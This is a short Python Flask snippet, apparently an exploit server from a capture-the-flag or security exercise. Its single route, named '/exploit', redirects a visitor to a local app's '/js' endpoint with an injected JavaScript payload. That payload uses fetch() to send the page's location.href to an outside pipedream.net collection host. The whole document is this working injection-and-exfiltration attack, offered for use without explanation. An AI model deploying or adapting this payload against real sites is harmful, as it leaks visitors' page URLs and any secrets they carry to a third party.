from flask import redirect
@app.route('/exploit')
def exploit():
    return redirect('http://127.0.0.1:5000/js?q=fetch("https://eo62lwd3xgz14zy.m.pipedream.net/?"+location.href)', code=302)
